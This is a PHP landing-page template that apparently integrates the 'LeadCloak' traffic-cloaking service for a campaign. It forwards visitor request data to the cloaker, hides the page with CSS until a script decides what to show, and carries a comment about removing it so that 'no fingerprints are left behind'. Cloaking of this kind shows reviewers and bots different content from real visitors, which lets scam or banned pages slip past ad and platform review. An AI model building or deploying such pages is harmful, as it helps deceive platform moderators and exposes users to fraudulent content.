<?php
/**
 * Campaign: BrendaWashington
 * Created: 2022-01-31 21:31:54 UTC
 */

require 'leadcloak-169ox635w5e9.php';

// ---------------------------------------------------
// Configuration

// Set this to false if application is properly installed.
$enableDebugging = true;

// Set this to false if you won't want to log error messages
$enableLogging = true;

if ($enableDebugging) {
	isApplicationReadyToRun();
}

if (isPost())
{
	// Allows for modded query strings
	$myQueryString = getForwardedQueryString($_POST);

	/**
	 *  Add or Modify Query String Variables in the section below.
	 *  WARNING: Variables with the same name will be re-written
	 */
    // Ex.: $myQueryString['my_custom_variable'] = 'my custom variable';

	$data = httpRequestMakePayload($campaignId, $campaignSignature, $_POST);

	$response = httpRequestExec($data);

	httpHandleResponse($response, $enableLogging);

	exit();
}
else
{
	try {
		loadJavascript($campaignId);
	} catch (Exception $e) {
		exit();
	}
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8">
	<title></title>
	<!-- Please keep the JS and CSS tags. You may remove this comment after integration and testing so that no fingerprints are left behind -->
	<style type="text/css"> html { display: none; }</style>
	<script type="text/javascript" src="169ox635w5e9.js"></script>
</head>
<body>

<!-- insert your html content here -->

</body>
</html>